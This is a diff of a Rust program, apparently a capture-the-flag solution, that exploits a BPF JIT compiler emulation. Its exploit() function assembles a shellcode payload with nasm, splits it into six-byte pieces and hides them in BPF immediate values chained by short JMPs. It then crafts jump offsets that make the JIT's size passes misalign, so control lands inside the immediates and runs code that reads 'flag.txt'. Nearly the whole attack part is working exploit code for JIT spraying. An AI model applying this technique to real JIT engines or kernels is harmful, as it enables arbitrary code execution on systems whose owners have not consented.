@@ -1,8 +1,8 @@
 use std::io::{self, Write};
-use std::{mem, u16};
-use std::collections::{HashMap, HashSet};
-use std::fs::File;
-use std::ops::{Add, AddAssign};
+use std::mem;
+use std::collections::HashMap;
+use std::ops::AddAssign;
+use std::path::Path;
 use std::process::{Command, Stdio};
 use arbitrary::{Arbitrary, Unstructured};
 
@@ -795,9 +795,10 @@ pub fn do_jit(b_inst: &[BpfInstT], addrs: &mut [u32], mut outimg: Option<&mut [u
                 let jmpoff : i64 = if cinst.off == -1 {
                     -2
                 } else {
-                    addrs[((cidx + 1) as i16 + cinst.off) as usize] as i64 - addrs[cidx + 1] as i64
+                    let o = addrs[((cidx + 1) as i16 + cinst.off) as usize] as i64 - addrs[cidx + 1] as i64;
+                    ja_offsets.push(o);
+                    o
                 };
-                ja_offsets.push(jmpoff);
 
                 if jmpoff != 0 {
                     if is_imm8!(jmpoff) {
@@ -1044,98 +1045,159 @@ fn disassemble(code: &[u8], name: &str) {
     std::fs::write(f2, out.stdout.as_slice()).unwrap();
 }
 
-fn add_immediate(space: &mut Vec<BpfInstT>, value: u64) {
+fn add_immediate(instructions: &mut Vec<BpfInstT>, reg: BpfRegT, value: u64) {
     // make sure that this will be 8 bytes
     assert!(!is_uimm32!(value));
-    space.push(BpfInstT { opc: 0x18, regs: 0, off: 0, imm: value as u32 as i32 });
-    space.push(BpfInstT { opc: 0, regs: 0, off: 0, imm: (value >> 32) as u32 as i32 });
+    instructions.push(BpfInstT { opc: 0x18, regs: reg as u8, off: 0, imm: value as u32 as i32 });
+    instructions.push(BpfInstT { opc: 0, regs: 0, off: 0, imm: (value >> 32) as u32 as i32 });
 }
 
-fn add_immediate_rbx(space: &mut Vec<BpfInstT>, value: u64) {
-    // make sure that this will be 8 bytes
-    assert!(!is_uimm32!(value));
-    space.push(BpfInstT { opc: 0x18, regs: 6, off: 0, imm: value as u32 as i32 });
-    space.push(BpfInstT { opc: 0, regs: 0, off: 0, imm: (value >> 32) as u32 as i32 });
+struct MachineCodeInstructions {
+    code: Vec<u8>,
+    offsets: Vec<usize>,
+    sizes: Vec<usize>,
+}
+
+fn assemble_payload(assembly: &Path, machine_code: &Path, disassembly: &Path) -> MachineCodeInstructions {
+    let nasm = Command::new("nasm")
+        .args(["-f", "bin", "-o"])
+        .arg(machine_code)
+        .arg(assembly)
+        .status().unwrap();
+    assert!(nasm.success());
+
+    let ndisasm = Command::new("ndisasm")
+        .args(["-b", "64"])
+        .arg(machine_code)
+        .stderr(Stdio::inherit())
+        .output().unwrap();
+
+    let out_string = String::from_utf8(ndisasm.stdout).unwrap();
+    std::fs::write(disassembly, &out_string).unwrap();
+
+    // NOTE: Contents look like this:
+    // 00000000  48B8666C61672E74  mov rax,0x7478742e67616c66
+    //          -7874
+    // 0000000A  48890424          mov [rsp],rax
+    let mut offsets = vec![];
+    for line in out_string.lines() {
+        if let Some(c) = line.chars().next() {
+            if c.is_digit(16) {
+                let offset = line.split_whitespace().next().unwrap();
+                let offset = usize::from_str_radix(offset, 16).unwrap();
+                offsets.push(offset);
+            }
+        }
+    }
+
+    let code = std::fs::read(machine_code).unwrap();
+
+    let mut sizes = vec![];
+    for i in 0..offsets.len() {
+        let start = offsets[i];
+        let end = offsets.get(i + 1).cloned().unwrap_or(code.len());
+        sizes.push(end - start);
+    }
+
+    MachineCodeInstructions { code, offsets, sizes }
+}
+
+impl MachineCodeInstructions {
+    fn combine(&mut self, max: usize) {
+        let mut offsets = vec![];
+        let mut sizes = vec![];
+        for (&offset, &size) in self.offsets.iter().zip(&self.sizes) {
+            match sizes.last_mut() {
+                Some(last) if *last + size <= max => *last += size,
+                _ => {
+                    offsets.push(offset);
+                    sizes.push(size);
+                },
+            }
+
+        }
+        self.offsets = offsets;
+        self.sizes = sizes;
+    }
+
+    fn nth(&self, index: usize) -> Option<&[u8]> {
+        self.offsets.get(index).map(|&offset| {
+            &self.code[offset..offset + self.sizes[index]]
+        })
+    }
+}
+
+fn encode_immediate(machine_code: &[u8], jump_offset: u8) -> u64 {
+    assert!(machine_code.len() <= 6);
+
+    let mut value = [0x90; 8]; // NOPs
+    value[0..machine_code.len()].copy_from_slice(machine_code);
+    value[6] = 0xeb; // JMP
+    value[7] = jump_offset;
+
+    u64::from_le_bytes(value)
 }
 
 fn exploit() {
+    let mut payload = assemble_payload(Path::new("payload.asm"), Path::new("payload.machine_code"), Path::new("payload.disasm"));
+    payload.combine(6);
+
+    let two_bytes = BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 };
     let mut instructions = vec![];
 
-    // store "flag.txt" into rax
-    add_immediate(&mut instructions, u64::from_le_bytes(*b"flag.txt"));
-    add_immediate_rbx(&mut instructions, u64::from_le_bytes(*b"\01234567")); // zero termination
+    // store "flag.txt\0" into rax and rbx
+    add_immediate(&mut instructions, BpfRegT::R0, u64::from_le_bytes(*b"flag.txt"));
+    add_immediate(&mut instructions, BpfRegT::R6, u64::from_le_bytes(*b"\01234567"));
 
-    instructions.push(BpfInstT { opc: 5, regs: 0, off: 10*2 + 4 + 1*2, imm: 0 });
-    // just to be sure that the instruction above doesn't shrink:
-    for _ in 0..10 {
-        add_immediate(&mut instructions, 0xb7b6b5b4b3b2b1b0);
-    }
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: 4 + 1*2, imm: 0 });
 
-    // shrink 2
     // off: 5 2 10 2 bytes
     instructions.push(BpfInstT { opc: 5, regs: 0, off: 2 + 1 + 10*2 + 4, imm: 0 });
     instructions.push(BpfInstT { opc: 5, regs: 0, off: 1 + 1 + 11*2 + 5, imm: 0 });
     instructions.push(BpfInstT { opc: 5, regs: 0, off: 0 + 1 + 11*2 + 7, imm: 0 });
 
-    // shrink 1
-    // instructions.push(BpfInstT { opc: 5, regs: 0, off: 11*2 + 8, imm: 0 }); // 11*10b + 8*2b = 126b
-    instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });
+    // instructions.push(BpfInstT { opc: 5, regs: 0, off: 11*2 + 8, imm: 0 });
+    instructions.push(two_bytes.clone());
 
-    let payload_sizes = [4, 5, 3, 5, 2+3, 3, 5, 3+2, 5, 3+2];
-    let payload = std::fs::read("payload").unwrap();
-    let mut payload_written = 0;
-
-    // cc causes SIGTRAP for debugger
+    // invalid jump goes here:
+    //   eb02 jumps 2 bytes forward
+    //   cc causes SIGTRAP for debugger
     // add_immediate(&mut instructions, 0x02ebcc_00_00000000);
-    add_immediate(&mut instructions, 0x02eb90_00_00000000);
+    add_immediate(&mut instructions, BpfRegT::R0, 0x02eb90_00_00000000);
+
+    // 100 bytes padding with payload
     for i in 0..10 {
-        if i >= payload_sizes.len() {
-            add_immediate(&mut instructions, u64::from_be(0xb83c0000000f0500)); // same as EPILOGUE
-        } else {
-            let size = payload_sizes[i];
-            let mut immediate = 0u64;
-            for b_index in 0..6 {
-                let byte = if b_index < size {
-                    let byte = payload[payload_written];
-                    payload_written += 1;
-                    byte
-                } else {
-                    0x90 // NOP
-                };
-                immediate |= byte as u64;
-                immediate <<= 8;
-            }
-            immediate |= 0xeb; // JMP
-            immediate <<= 8;
-            immediate |= 2; // offset (added to EIP = start of next instruction)
-            add_immediate(&mut instructions, u64::from_be(immediate));
-        }
+        let jump_offset = if i < 9 { 2 } else { 14 * 2 + 2 };
+        let immediate = encode_immediate(payload.nth(i).unwrap_or(&[]), jump_offset);
+        add_immediate(&mut instructions, BpfRegT::R0, immediate);
     }
 
-    let n = 9;
-    for i in 0..n {
-        if i == 0 {
-            // off: 16 + 2|5 + 100 + 8 bytes
-            instructions.push(BpfInstT { opc: 5, regs: 0, off: (n-1) + 1 + 10*2 + 4, imm: 0 });
-        } else {
-            instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });
-        }
+    // JUMP0
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: 8 + 1 + 4 + 10*2, imm: 0 });
+
+    for _ in 0..8 {
+        instructions.push(two_bytes.clone());
     }
 
     // off: 2|5 2 10
-    instructions.push(BpfInstT { opc: 5, regs: 0, off: -1 - n - 10*2, imm: 0 });
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: -1 - 8 - 1 - 10*2, imm: 0 });
 
-    for _ in 0..10 {
-        add_immediate(&mut instructions, 0xb7b6b5b4b3b2b1b0);
-    }
-    for _ in 0..8 {
+    for _ in 0..4 {
         instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });
+    }
+
+    // 100+ bytes padding with payload
+    let n = 10 + payload.offsets.len().max(11);
+    for i in 10..n {
+        let jump_offset = if i < n { 2 } else { 0 };
+        let immediate = encode_immediate(payload.nth(i).unwrap_or(&[]), jump_offset);
+        add_immediate(&mut instructions, BpfRegT::R0, immediate);
     }
 
     let bytes = to_raw_bytes(&instructions);
     let mut encoded = hex::encode(bytes);
     encoded.push('\n');
-    std::fs::write("exploit.hex", encoded);
+    std::fs::write("exploit.hex", encoded).unwrap();
 
     run(&instructions);
 }
@@ -1207,14 +1269,13 @@ pub fn run(insts: &Vec<BpfInstT>) {
 
     let mut flag = false;
 
-    println!("olen {} {:?}", olen, addrs);
+    println!("olen {}", olen);
     for _ in 0..20 {
         addrs_clone.copy_from_slice(&addrs);
 
         if let Some(nlen) = do_jit(&insts, &mut addrs, None) {
             println!("nlen {}", nlen);
             if nlen == olen {
-                println!("flag=true, (addrs==addrs_clone) is {}", addrs == addrs_clone);
                 flag = true;
                 break;
             }
@@ -1224,6 +1285,8 @@ pub fn run(insts: &Vec<BpfInstT>) {
             break;
         }
     }
+    println!("flag={}, {}", flag, if addrs == addrs_clone {"addrs did not change"} else { "addrs changed"});
+
     let mut image: [u8; 8192 + PROLOGUELEN + EPILOGUELEN] = [0; 8192 + PROLOGUELEN + EPILOGUELEN];
 
     assert!(flag, "flag");
